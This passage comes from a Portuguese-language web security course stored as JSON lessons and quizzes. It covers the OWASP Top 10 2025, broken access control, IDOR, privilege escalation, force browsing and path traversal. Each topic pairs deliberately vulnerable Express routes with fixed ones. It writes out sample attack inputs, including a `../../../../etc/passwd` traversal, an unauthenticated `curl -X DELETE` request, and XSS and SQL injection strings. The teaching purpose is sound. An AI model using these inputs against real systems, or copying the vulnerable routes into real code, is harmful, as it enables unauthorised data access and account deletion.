                                "isCorrect": true
                            },
                            {
                                "text": "Não há risco: refletir a origem enviada é a prática recomendada quando existem credenciais.",
                                "isCorrect": false
                            },
                            {
                                "text": "O problema afeta apenas o desempenho do servidor, sem nenhum impacto real na segurança.",
                                "isCorrect": false
                            },
                            {
                                "text": "Isso desativa o HTTPS por completo e faz o servidor voltar a aceitar novamente conexões em texto puro.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "Anatomia de um ataque e o OWASP Top 10 2025",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# Anatomia de um ataque e o OWASP Top 10 2025\n\nVocê já tem as peças: sabe como o HTTP funciona, como o servidor mantém sessões e por que nunca se confia no cliente. Agora vamos juntar tudo em dois mapas mentais: **como um atacante pensa** e **como a indústria organiza os principais riscos**, através do OWASP Top 10 2025.\n\n## Pensando como um atacante\n\nUm atacante não enxerga telas bonitas; ele enxerga **entradas**. O conjunto de todos os pontos por onde dados entram na sua aplicação, e que ele pode manipular, é a **superfície de ataque**: URLs e seus parâmetros, campos de formulário, cabeçalhos, cookies, corpos de requisição, uploads de arquivo, cada endpoint de API. Quanto maior a superfície, mais lugares para sondar."
                    },
                    {
                        "type": "text",
                        "value": "## As fases de um ataque\n\nNa prática, um ataque a uma aplicação web costuma seguir um roteiro parecido com este:\n\n1. **Reconhecimento**: mapear o alvo, tecnologias, endpoints, comportamento.\n2. **Identificar entradas**: listar tudo o que aceita dados do usuário.\n3. **Sondar e manipular**: enviar valores inesperados, malformados ou maliciosos e observar as reações (mensagens de erro, mudanças de comportamento).\n4. **Explorar**: transformar uma falha encontrada em impacto real, ler dados de outra pessoa, executar um comando, assumir uma conta.\n5. **Impacto e persistência**: extrair dados, manter acesso, escalar privilégios.\n\nDefender é fazer esse mesmo percurso **antes** do atacante. Por isso repetimos: para cada entrada, pergunte \"o que acontece se isto vier mentindo?\"."
                    },
                    {
                        "type": "quote",
                        "value": "Onde há entrada, há superfície de ataque. Reduzir a superfície, tratar toda entrada como hostil e validar no servidor são as defesas que se repetem contra praticamente todos os riscos do OWASP Top 10."
                    },
                    {
                        "type": "text",
                        "value": "## O que é o OWASP Top 10\n\nA **OWASP** (Open Worldwide Application Security Project) é uma organização sem fins lucrativos dedicada à segurança de software. O seu documento mais famoso é o **OWASP Top 10**: uma lista das **dez categorias de risco de segurança mais críticas** para aplicações web, construída a partir de dados da indústria e da opinião de especialistas, e revisada periodicamente.\n\nPara que serve:\n\n- É um **guia de prioridades** e uma **linguagem comum**: quando alguém diz \"A01\", a equipe toda sabe do que se trata.\n- É um **ponto de partida para conscientização**, não uma certificação nem uma checklist completa. Estar livre dos dez não significa estar \"seguro\".\n\nA edição vigente é a de **2025**, e é ela que ancora o resto desta trilha: cada módulo seguinte mergulha em uma ou mais dessas categorias, sempre com o par código inseguro x código seguro."
                    },
                    {
                        "type": "table",
                        "value": "[[\"Código\", \"Categoria (2025)\", \"Em uma frase\"], [\"A01\", \"Broken Access Control (Controle de acesso quebrado)\", \"Usuários acessam dados ou ações que não deveriam.\"], [\"A02\", \"Security Misconfiguration (Configuração incorreta)\", \"Padrões inseguros, serviços expostos, cabeçalhos e permissões mal ajustados.\"], [\"A03\", \"Software Supply Chain Failures (Falhas na cadeia de suprimentos de software)\", \"Riscos vindos de dependências, bibliotecas e do pipeline de build.\"], [\"A04\", \"Cryptographic Failures (Falhas criptográficas)\", \"Dados sensíveis sem cifra, com cifra fraca ou mal aplicada.\"], [\"A05\", \"Injection (Injeção)\", \"Entrada não tratada vira comando: SQL, comandos de SO e também XSS.\"], [\"A06\", \"Insecure Design (Design inseguro)\", \"Faltou pensar em segurança já na concepção do sistema.\"], [\"A07\", \"Authentication Failures (Falhas de autenticação)\", \"Login e sessões fracos: senhas frágeis, força bruta, sessão mal gerida.\"], [\"A08\", \"Software or Data Integrity Failures (Falhas de integridade de software ou dados)\", \"Confiar em código ou dados sem verificar origem e integridade.\"], [\"A09\", \"Security Logging and Alerting Failures (Falhas de logging e alerta de segurança)\", \"Sem registros e alertas, ataques passam despercebidos.\"], [\"A10\", \"Mishandling of Exceptional Conditions (Tratamento incorreto de condições excepcionais)\", \"Erros e casos-limite tratados de forma insegura (vazam dados, fail-open).\"]]"
                    },
                    {
                        "type": "text",
                        "value": "## O que mudou na edição 2025\n\nSe você já ouviu falar do Top 10 antes, vale notar as novidades desta edição:\n\n- **Configuração incorreta** subiu para **A02**, refletindo o quanto ambientes mal configurados causam incidentes.\n- **Falhas na cadeia de suprimentos de software (A03)** é a evolução, mais ampla, da antiga categoria de \"componentes vulneráveis e desatualizados\": agora inclui o ecossistema de dependências e o próprio pipeline de build.\n- **Tratamento incorreto de condições excepcionais (A10)** é uma **categoria nova**, sobre como erros e casos-limite mal tratados viram brechas.\n- **Injeção** deixou o topo e agora é **A05**, e continua englobando o **XSS** (Cross-Site Scripting).\n\n## Como usar este mapa\n\nNão tente decorar a lista. Use-a como um índice de preocupações. A partir do próximo módulo, cada categoria vira uma investigação prática: o que é, como o ataque acontece, o código que falha e o código que corrige. O alicerce você já tem: **entenda o HTTP, respeite a fronteira de confiança e nunca confie no cliente**."
                    }
                ],
                "questions": [
                    {
                        "statement": "O que é o OWASP Top 10?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Uma lista da OWASP com as dez categorias de risco mais críticas, usada como guia de prioridades.",
                                "isCorrect": true
                            },
                            {
                                "text": "Uma ferramenta que corrige vulnerabilidades automaticamente no código da aplicação.",
                                "isCorrect": false
                            },
                            {
                                "text": "Uma lei internacional que obriga todas as empresas a seguir dez regras fixas de segurança.",
                                "isCorrect": false
                            },
                            {
                                "text": "Um ranking anual divulgado pela OWASP com os dez frameworks web mais usados no mercado atual.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "O que é a \"superfície de ataque\" de uma aplicação?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Os pontos por onde dados entram e podem ser manipulados, como URLs, formulários e cookies.",
                                "isCorrect": true
                            },
                            {
                                "text": "Somente a tela de login e o formulário de autenticação inicial da aplicação inteira.",
                                "isCorrect": false
                            },
                            {
                                "text": "O visual em CSS da aplicação, que costuma chamar a atenção do atacante logo de início.",
                                "isCorrect": false
                            },
                            {
                                "text": "A quantidade total de servidores físicos que a empresa mantém contratados atualmente.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um usuário comum troca o id na URL /pedidos/1001 por /pedidos/1002 e passa a ver o pedido de outra pessoa. A qual categoria do OWASP Top 10 2025 isso pertence?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "A01 - Broken Access Control (Controle de acesso quebrado).",
                                "isCorrect": true
                            },
                            {
                                "text": "A04 - Cryptographic Failures (Falhas criptográficas).",
                                "isCorrect": false
                            },
                            {
                                "text": "A09 - Security Logging and Alerting Failures (Falhas de logging e alerta).",
                                "isCorrect": false
                            },
                            {
                                "text": "A02 - Security Misconfiguration (Configuração incorreta).",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Na edição 2025 do OWASP Top 10, onde se encaixa o XSS (Cross-Site Scripting)?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Dentro da categoria A05 - Injection (Injeção).",
                                "isCorrect": true
                            },
                            {
                                "text": "Em uma categoria própria e isolada, a A01.",
                                "isCorrect": false
                            },
                            {
                                "text": "Não é mais considerado um risco pela OWASP.",
                                "isCorrect": false
                            },
                            {
                                "text": "Dentro de A07 - Authentication Failures.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Qual afirmação sobre a edição 2025 do OWASP Top 10 está correta?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "A10 é categoria nova sobre condições excepcionais, e A03 amplia a antiga lista de componentes vulneráveis.",
                                "isCorrect": true
                            },
                            {
                                "text": "A injeção segue sendo classificada oficialmente como a categoria A01, permanecendo sempre no topo da lista.",
                                "isCorrect": false
                            },
                            {
                                "text": "A categoria \"Security Misconfiguration\" foi totalmente removida na nova atualização de 2025.",
                                "isCorrect": false
                            },
                            {
                                "text": "As dez categorias de 2025 permanecem totalmente idênticas em ordem e nome às da edição de 2021.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            }
        ]
    },
    {
        "titulo": "Módulo 2 - Controle de acesso quebrado (A01) e falhas de autenticação (A07)",
        "aulas": [
            {
                "titulo": "Controle de acesso quebrado: o líder do OWASP Top 10",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# Controle de acesso quebrado: o líder do OWASP Top 10\n\nBem-vindo ao módulo mais importante desta trilha. Não é exagero: no **OWASP Top 10 2025**, o **Controle de acesso quebrado** (_Broken Access Control_) aparece como **A01**, ou seja, a categoria número um, a que mais causa problemas em aplicações reais. Se você só pudesse blindar uma coisa na sua aplicação, começaria por aqui.\n\nAntes de falar do que quebra, precisamos alinhar dois conceitos que muita gente confunde: **autenticação** e **autorização**.\n\n- **Autenticação** (_authentication_) responde à pergunta 'quem é você?'. É o login: provar a identidade com senha, token ou biometria.\n- **Autorização** (_authorization_) responde a 'o que você pode fazer?'. É decidir se aquele usuário, já identificado, tem permissão para ver, criar, editar ou apagar determinado recurso.\n\n**Controle de acesso** é o nome que damos à autorização em ação: as regras que garantem que cada usuário só faça aquilo que lhe é permitido. Quando essas regras estão ausentes, incompletas ou podem ser contornadas, dizemos que o controle de acesso está **quebrado**."
                    },
                    {
                        "type": "table",
                        "value": "[[\"Pergunta\", \"Conceito\", \"Exemplo\", \"O que acontece se falhar\"], [\"Quem é você?\", \"Autenticação\", \"Login com senha e MFA\", \"Um estranho entra fingindo ser outra pessoa\"], [\"O que você pode fazer?\", \"Autorização (controle de acesso)\", \"Só o dono edita o próprio pedido\", \"Um usuário comum apaga dados de todos\"]]"
                    },
                    {
                        "type": "text",
                        "value": "## Os princípios que sustentam o controle de acesso\n\nUm bom controle de acesso segue duas regras de ouro:\n\n- **Negar por padrão** (_deny by default_): tudo é proibido, exceto o que for explicitamente liberado. O contrário (liberar tudo e tentar bloquear caso a caso) sempre deixa brechas.\n- **Menor privilégio** (_least privilege_): cada usuário e cada parte do sistema recebe **apenas** as permissões estritamente necessárias, nada além.\n\nO controle de acesso quebra de várias formas, e cada uma vira uma aula deste módulo: **IDOR** (trocar um identificador para acessar o objeto de outra pessoa), **escalonamento de privilégio** (ganhar poderes que você não deveria ter), **force browsing** (acessar URLs escondidas) e **path traversal** (escapar da pasta permitida). Mas quase todas nascem do **mesmo erro de raiz**, que veremos agora.\n\n## O erro clássico: confiar no front-end\n\nO front-end é código que roda no navegador do usuário. E o usuário controla o próprio navegador: ele pode abrir o DevTools, editar o HTML e chamar a sua API direto pelo terminal com `curl` ou pelo Postman. Por isso vale a regra mais importante da aula:\n\n**Esconder um botão não é controle de acesso.** Se a única barreira for a interface, não há barreira nenhuma."
                    },
                    {
                        "type": "code",
                        "value": "// FRONT-END: some o botão de excluir para quem não é admin\nif (usuario.role === \"admin\") {\n  mostrarBotao(\"Excluir usuário\");\n}\n\n// BACK-END: a rota confia que só o admin chega aqui... e NÃO verifica nada\napp.delete(\"/api/usuarios/:id\", exigirLogin, (req, res) => {\n  db.usuarios.excluir(req.params.id);\n  res.json({ ok: true });\n});\n\n// O ataque nem precisa da interface:\n//   curl -X DELETE https://site.com/api/usuarios/42\n// Qualquer usuário logado apaga qualquer conta."
                    },
                    {
                        "type": "code",
                        "value": "// A decisão de autorização mora no SERVIDOR, sempre\napp.delete(\"/api/usuarios/:id\", exigirLogin, (req, res) => {\n  if (req.usuario.role !== \"admin\") {\n    return res.status(403).json({ erro: \"Acesso negado\" });\n  }\n  db.usuarios.excluir(req.params.id);\n  res.json({ ok: true });\n});\n\n// Esconder o botão no front continua valendo (boa experiência),\n// mas agora é só um detalhe visual, não a segurança."
                    },
                    {
                        "type": "quote",
                        "value": "**Recapitulando:** **autenticação** é provar quem você é; **autorização** (o controle de acesso) é definir o que você pode fazer. O **Controle de acesso quebrado** é a categoria **A01** do OWASP Top 10 2025 justamente porque falha com facilidade. Programe com **negação por padrão** e **menor privilégio**, e lembre da regra de ouro: toda decisão de acesso precisa ser tomada no **servidor**, nunca no front-end. Esconder um botão não protege nada."
                    }
                ],
                "questions": [
                    {
                        "statement": "Qual a diferença entre autenticação e autorização?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Autenticação prova quem você é no login; autorização decide o que essa pessoa pode fazer.",
                                "isCorrect": true
                            },
                            {
                                "text": "Autorização prova quem você é no login; autenticação decide o que você pode fazer.",
                                "isCorrect": false
                            },
                            {
                                "text": "Autenticação e autorização são a mesma coisa: dois nomes para o processo de login.",
                                "isCorrect": false
                            },
                            {
                                "text": "Autenticação é feita pelo servidor; autorização é feita apenas pelo navegador do usuário.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "O que significa o princípio de 'negar por padrão' (deny by default) no controle de acesso?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Por padrão tudo é proibido, e só fica liberado o que for explicitamente permitido.",
                                "isCorrect": true
                            },
                            {
                                "text": "Por padrão tudo é liberado, e só fica bloqueado o que for explicitamente proibido.",
                                "isCorrect": false
                            },
                            {
                                "text": "O sistema bloqueia contas novas até um administrador aprovar o primeiro acesso.",
                                "isCorrect": false
                            },
                            {
                                "text": "A permissão de acesso é decidida pelo navegador, não pelo servidor da aplicação.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Analise a rota abaixo. Qual é o problema de segurança?\n\n`app.delete('/api/usuarios/:id', exigirLogin, (req, res) => { db.usuarios.excluir(req.params.id); res.json({ ok: true }); })`",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Falta checar o papel; qualquer conta autenticada consegue excluir qualquer outra conta.",
                                "isCorrect": true
                            },
                            {
                                "text": "Falta validar se o parâmetro id é numérico, o que deixa a rota vulnerável a injeção de SQL.",
                                "isCorrect": false
                            },
                            {
                                "text": "Nenhum: o middleware exigirLogin por si só já restringe essa rota a administradores.",
                                "isCorrect": false
                            },
                            {
                                "text": "Falta cifrar o corpo da resposta JSON antes de devolvê-la de volta para o navegador.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um desenvolvedor esconde o botão 'Excluir' no front-end para os usuários comuns e considera a função protegida. Por que isso é inseguro?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "O usuário controla o navegador e pode chamar a API direto, sem passar pela interface.",
                                "isCorrect": true
                            },
                            {
                                "text": "Navegadores antigos costumam ignorar regras de CSS e acabam exibindo o botão escondido.",
                                "isCorrect": false
                            },
                            {
                                "text": "Ocultar elementos da tela com JavaScript aumenta bastante o tempo de carregamento.",
                                "isCorrect": false
                            },
                            {
                                "text": "É seguro sim: sem o botão visível na tela, não existe forma de disparar essa ação.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Uma API possui endpoints para usuários comuns e para administradores. Qual abordagem oferece o controle de acesso mais robusto?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Verificar identidade e permissão no servidor a cada requisição, negando por padrão o que não for liberado.",
                                "isCorrect": true
                            },
                            {
                                "text": "Confiar num campo isAdmin dentro do próprio token JWT, já que foi definido no navegador do cliente.",
                                "isCorrect": false
                            },
                            {
                                "text": "Retirar os endpoints de administração da documentação pública, assim ninguém consegue achá-los.",
                                "isCorrect": false
                            },
                            {
                                "text": "Checar a permissão uma única vez, apenas no momento do login, e liberar o resto sem novas checagens depois disso.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "IDOR: quando trocar o id na URL abre a porta",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# IDOR: quando trocar o id na URL abre a porta\n\nImagine que você acessa a sua nota fiscal e a URL é `https://loja.com/notas/1005`. Por curiosidade, você troca para `1006` e... aparece a nota de outro cliente, com nome, CPF e endereço. Você acabou de explorar um **IDOR**.\n\n**IDOR** vem de _Insecure Direct Object Reference_, ou **referência direta insegura a objeto**. Vamos por partes:\n\n- **Referência direta a objeto**: a aplicação usa um identificador vindo do usuário (o `1005` da URL, um parâmetro, um campo escondido) para buscar um objeto direto no banco ou no disco.\n- **Insegura**: usar esse identificador não é o problema. O problema é buscar o objeto **sem verificar** se o usuário logado tem direito **àquele** objeto específico.\n\nO IDOR é a forma mais comum de controle de acesso quebrado, e uma das mais fáceis de explorar: às vezes basta trocar um número na barra de endereço."
                    },
                    {
                        "type": "code",
                        "value": "// GET /api/pedidos/1005\napp.get(\"/api/pedidos/:id\", exigirLogin, (req, res) => {\n  const pedido = db.pedidos.buscarPorId(req.params.id);\n  return res.json(pedido);\n});\n\n// O usuário está logado (autenticado), mas a rota nunca pergunta:\n// \"este pedido é DELE?\". Basta trocar 1005 por 1006, 1007...\n// e ler os pedidos de todos os clientes."
                    },
                    {
                        "type": "text",
                        "value": "## Por que dói tanto\n\nO impacto do IDOR vai do vazamento de dados pessoais (o caso da nota fiscal) até ações destrutivas, quando o mesmo erro está num `PUT` ou `DELETE`: editar o endereço de entrega de outra pessoa, cancelar o pedido dela, baixar o boleto alheio. Como o atacante já está logado com uma conta legítima, muitas defesas de perímetro não percebem nada de errado.\n\n## A correção: dono verificado no servidor\n\nA regra é simples e poderosa: **o identificador do dono nunca vem da requisição, vem da sessão**. O usuário pode mentir sobre qual pedido quer (o `:id`), mas não pode mentir sobre quem ele é, porque isso está no token ou na sessão que o servidor controla. A consulta então cruza os dois: me dê o pedido X **se** ele pertencer ao usuário logado."
                    },
                    {
                        "type": "code",
                        "value": "// Node: cruze o objeto pedido com o dono vindo da SESSÃO\napp.get(\"/api/pedidos/:id\", exigirLogin, (req, res) => {\n  const pedido = db.pedidos.buscarPorId(req.params.id);\n  if (!pedido || pedido.clienteId !== req.usuario.id) {\n    // 404 (e não 403) para nem confirmar que o pedido existe\n    return res.status(404).json({ erro: \"Pedido não encontrado\" });\n  }\n  return res.json(pedido);\n});\n\n-- Ou já filtre no banco, cruzando o id do objeto com o id do dono:\nSELECT * FROM pedidos\nWHERE id = $1          -- veio da URL (o que o usuário pediu)\n  AND cliente_id = $2; -- veio da SESSÃO (quem o usuário é)"
                    },
                    {
                        "type": "text",
                        "value": "## Dois cuidados que muita gente erra\n\n**Trocar o id sequencial por um UUID não resolve o IDOR.** Usar identificadores difíceis de adivinhar (como `a3f9c2...`) ajuda um pouco, mas é só **segurança por obscuridade**: o id ainda vaza em URLs, e-mails, logs e respostas de API. Um id imprevisível é uma camada extra, jamais o substituto da verificação de dono.\n\n**Verifique o dono em TODA operação, não só na leitura.** É comum blindar o `GET` e esquecer que o `PUT`, o `DELETE` e o `POST` também recebem um id do usuário. Cada endpoint que aceita um identificador precisa perguntar: o usuário logado pode mexer neste objeto?"
                    },
                    {
                        "type": "quote",
                        "value": "**Recapitulando:** o **IDOR** acontece quando a aplicação busca um objeto por um identificador vindo do usuário **sem checar se aquele usuário é o dono**. A correção é sempre a mesma: cruze o objeto solicitado com o id do dono **tirado da sessão**, não da requisição, e faça isso em todas as operações (ler, criar, editar, apagar). Trocar id sequencial por UUID ajuda, mas não substitui a verificação de dono."
                    }
                ],
                "questions": [
                    {
                        "statement": "O que caracteriza uma vulnerabilidade de IDOR (referência direta insegura a objeto)?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "A aplicação busca um objeto pelo id que o usuário informou, sem checar se pode acessá-lo.",
                                "isCorrect": true
                            },
                            {
                                "text": "A aplicação grava as senhas de todos os usuários em texto puro dentro do banco de dados principal.",
                                "isCorrect": false
                            },
                            {
                                "text": "Um campo de busca mal validado permite que o usuário injete comandos SQL na consulta.",
                                "isCorrect": false
                            },
                            {
                                "text": "A página carrega scripts de terceiros sem nenhuma verificação de origem ou integridade.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Ao acessar `minhaconta.com/faturas/8821`, um usuário troca o número para `8822` e passa a ver a fatura de outra pessoa. Que vulnerabilidade é essa?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "IDOR: referência direta insegura ao objeto de outra pessoa.",
                                "isCorrect": true
                            },
                            {
                                "text": "Path traversal: travessia para fora da pasta de arquivos.",
                                "isCorrect": false
                            },
                            {
                                "text": "Injeção de SQL: comando SQL inserido num campo de entrada.",
                                "isCorrect": false
                            },
                            {
                                "text": "Cross-Site Scripting: script malicioso refletido na página.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "A rota `GET /api/pedidos/:id` retorna o pedido sem checar o dono. Qual correção elimina o IDOR?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Buscar o pedido e só devolvê-lo se o dono corresponder ao id do usuário tirado da sessão.",
                                "isCorrect": true
                            },
                            {
                                "text": "Substituir o id sequencial da URL por um identificador UUID gerado aleatoriamente.",
                                "isCorrect": false
                            },
                            {
                                "text": "Bastar que o usuário esteja autenticado, sem checar mais nada, para liberar o acesso à rota.",
                                "isCorrect": false
                            },
                            {
                                "text": "Sempre responder com status 200, mesmo em erro, para não dar pistas ao atacante.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um time troca os ids sequenciais das URLs por UUIDs aleatórios para 'resolver' o IDOR, mas mantém as rotas sem checar o dono. Essa decisão é suficiente?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Não: o UUID só dificulta adivinhar o id; sem checar o dono, um id vazado expõe o objeto.",
                                "isCorrect": true
                            },
                            {
                                "text": "Sim: um identificador UUID aleatório torna impossível acessar objetos de outro usuário.",
                                "isCorrect": false
                            },
                            {
                                "text": "Sim, desde que o UUID gerado tenha no mínimo 128 bits de entropia no total.",
                                "isCorrect": false
                            },
                            {
                                "text": "Não, porque o uso de UUIDs deixa as consultas ao banco de dados sensivelmente mais lentas.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Analise a consulta usada por um endpoint de edição:\n\n`UPDATE pedidos SET status = $1 WHERE id = $2 AND cliente_id = $3`\n\nO desenvolvedor preenche `$3` com o campo `clienteId` enviado no corpo da requisição. Por que isso continua vulnerável?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "O atacante controla o corpo e pode enviar o clienteId da vítima; o id do dono deveria vir da sessão.",
                                "isCorrect": true
                            },
                            {
                                "text": "Porque comandos do tipo UPDATE nunca deveriam ser escritos como prepared statements parametrizados.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque a cláusula WHERE deveria comparar primeiro o status antes de comparar o identificador do pedido.",
                                "isCorrect": false
                            },
                            {
                                "text": "Não há vulnerabilidade nenhuma: a cláusula AND cliente_id já garante sozinha que o dono foi checado.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "Escalonamento de privilégio, force browsing e path traversal",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# Escalonamento de privilégio, force browsing e path traversal\n\nNo IDOR da aula anterior, o atacante pegava o objeto de **outra pessoa do mesmo nível** que ele. Quando o objetivo é obter **mais poder** do que se deveria ter, falamos em **escalonamento de privilégio** (_privilege escalation_), que vem em dois sabores:\n\n- **Escalonamento horizontal**: o atacante mantém o mesmo nível de permissão, mas alcança recursos de **outro usuário igual a ele**. Um cliente que lê o pedido de outro cliente fez escalonamento horizontal (o IDOR é o exemplo clássico).\n- **Escalonamento vertical**: o atacante **sobe de nível**, um usuário comum passando a executar ações de administrador. É o mais grave dos dois.\n\nUm caminho comum para o escalonamento vertical é a **adulteração da requisição**. Se o servidor copia cegamente o corpo enviado pelo usuário para o banco (o chamado _mass assignment_, ou atribuição em massa), basta o atacante incluir um campo a mais, como um `role` valendo `admin`, para se promover sozinho. A defesa é aceitar apenas uma **lista branca** (_allowlist_) dos campos que o usuário realmente pode alterar.\n\nNesta aula vemos ainda duas outras formas de controle de acesso quebrado: o **force browsing** (acessar funções pela URL) e o **path traversal** (escapar da pasta de arquivos permitida)."
                    },
                    {
                        "type": "text",
                        "value": "## Force browsing: a URL que ninguém deveria adivinhar\n\nUm erro muito frequente é achar que uma funcionalidade está protegida só porque **o link não aparece no menu**. O painel de administração some da interface do usuário comum, mas a rota `/admin/relatorios` continua existindo e respondendo. Se o atacante **digitar ou adivinhar** essa URL e o servidor entregar o conteúdo, temos **force browsing**, também chamado de **falta de controle de acesso em nível de função** (_missing function level access control_).\n\nA causa é a mesma do erro clássico do módulo: a proteção estava na interface, não no servidor. A rota precisa **verificar o papel** de quem a chama, exista ou não um link apontando para ela. Um _middleware_ reutilizável resolve isso de forma limpa:"
                    },
                    {
                        "type": "code",
                        "value": "// VULNERÁVEL: a rota existe e só exige login, não o papel de admin\napp.get(\"/admin/relatorios\", exigirLogin, (req, res) => {\n  res.json(db.relatorios.todos()); // basta adivinhar a URL\n});\n\n// SEGURO: um middleware reutilizável que exige o papel certo\nfunction exigirPapel(papel) {\n  return (req, res, next) => {\n    if (req.usuario?.role !== papel) {\n      return res.status(403).json({ erro: \"Acesso negado\" });\n    }\n    next();\n  };\n}\n\napp.get(\"/admin/relatorios\", exigirLogin, exigirPapel(\"admin\"), (req, res) => {\n  res.json(db.relatorios.todos());\n});"
                    },
                    {
                        "type": "text",
                        "value": "## Path traversal: escapando da pasta permitida\n\nÀs vezes o objeto não é uma linha do banco, é um **arquivo**. Quando a aplicação monta o caminho de um arquivo a partir de algo que o usuário digitou, o atacante pode usar a sequência `../` (subir um diretório) para **escapar** da pasta permitida e ler arquivos sensíveis do servidor: configurações, código-fonte, chaves, até o `/etc/passwd` do sistema. Isso é **path traversal** (ou _directory traversal_).\n\nO exemplo abaixo pretende servir arquivos de `/var/app/arquivos`, mas confia no nome que o usuário enviou. A correção não tenta 'limpar' o texto na base da tentativa e erro: ela **resolve** o caminho final e confirma que ele permaneceu **dentro** da pasta base."
                    },
                    {
                        "type": "code",
                        "value": "// VULNERÁVEL: /download?arquivo=relatorio.pdf\napp.get(\"/download\", (req, res) => {\n  const caminho = path.join(\"/var/app/arquivos\", req.query.arquivo);\n  res.sendFile(caminho);\n  // arquivo=../../../../etc/passwd sobe as pastas e lê o arquivo do sistema\n});\n\n// SEGURO: normalize e confirme que o caminho final NÃO saiu da pasta base\napp.get(\"/download\", (req, res) => {\n  const base = \"/var/app/arquivos\";\n  const nome = path.basename(req.query.arquivo);   // descarta qualquer ../\n  const alvo = path.resolve(base, nome);\n  if (!alvo.startsWith(base + path.sep)) {\n    return res.status(400).json({ erro: \"Caminho inválido\" });\n  }\n  res.sendFile(alvo);\n});"
                    },
                    {
                        "type": "quote",
                        "value": "**Recapitulando:** o **escalonamento horizontal** alcança recursos de um usuário do mesmo nível; o **vertical** conquista poderes de admin (muitas vezes via _mass assignment_, que se corrige com lista branca de campos). O **force browsing** acessa rotas que não aparecem na interface, e a defesa é checar o papel no servidor, não esconder o link. O **path traversal** usa `../` para escapar da pasta permitida; corrija resolvendo o caminho e confirmando que ele continua dentro da pasta base."
                    }
                ],
                "questions": [
                    {
                        "statement": "Um usuário comum consegue acessar o painel de administração e passa a gerenciar todas as contas. Que tipo de escalonamento de privilégio é esse?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Escalonamento vertical: o atacante passa a ter permissões de um nível acima do seu.",
                                "isCorrect": true
                            },
                            {
                                "text": "Escalonamento horizontal: o atacante acessa recursos de outro usuário do mesmo nível.",
                                "isCorrect": false
                            },
                            {
                                "text": "Não é escalonamento de privilégio, é apenas mais um exemplo comum de IDOR.",
                                "isCorrect": false
                            },
                            {
                                "text": "Path traversal: o atacante escapou da pasta de arquivos permitida no servidor.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "O que é 'force browsing'?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Acessar direto uma URL fora do menu, apostando que o servidor não confere a permissão.",
                                "isCorrect": true
                            },
                            {
                                "text": "Forçar o navegador a recarregar a mesma página várias vezes seguidas até derrubar o servidor.",
                                "isCorrect": false
                            },
                            {
                                "text": "Abrir o site inteiro em modo anônimo para não deixar nenhum rastro no histórico local.",
                                "isCorrect": false
                            },
                            {
                                "text": "Preencher todos os formulários do site de forma automática usando um robô programado.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "O trecho `res.sendFile(path.join('/var/app/arquivos', req.query.arquivo))` atende `/download?arquivo=...`. Qual valor de `arquivo` demonstra a vulnerabilidade, e qual é o nome dela?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "`../../../../etc/passwd`, um path traversal que foge da pasta de arquivos liberada.",
                                "isCorrect": true
                            },
                            {
                                "text": "`<script>alert(1)</script>`, um XSS refletido injetado no parâmetro da URL.",
                                "isCorrect": false
                            },
                            {
                                "text": "`' OR '1'='1`, uma injeção de SQL clássica que altera a cláusula WHERE.",
                                "isCorrect": false
                            },
                            {
                                "text": "`admin`, um valor que dispara o escalonamento vertical ao virar o papel do usuário.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um endpoint de perfil faz `db.usuarios.atualizar(req.usuario.id, req.body)`, copiando todo o corpo da requisição para o banco. Como um atacante pode usar isso para escalonamento vertical?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Enviando no corpo um campo role valendo admin, que é gravado e vira administrador.",
                                "isCorrect": true
                            },
                            {
                                "text": "Enviando um corpo de requisição enorme e repetido para esgotar a memória do servidor.",
                                "isCorrect": false
                            },
                            {
                                "text": "Trocando o verbo da requisição de POST para GET logo antes de enviar o formulário.",
                                "isCorrect": false
                            },
                            {
                                "text": "Não é possível fazer isso: o servidor descarta sozinho qualquer campo desconhecido.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
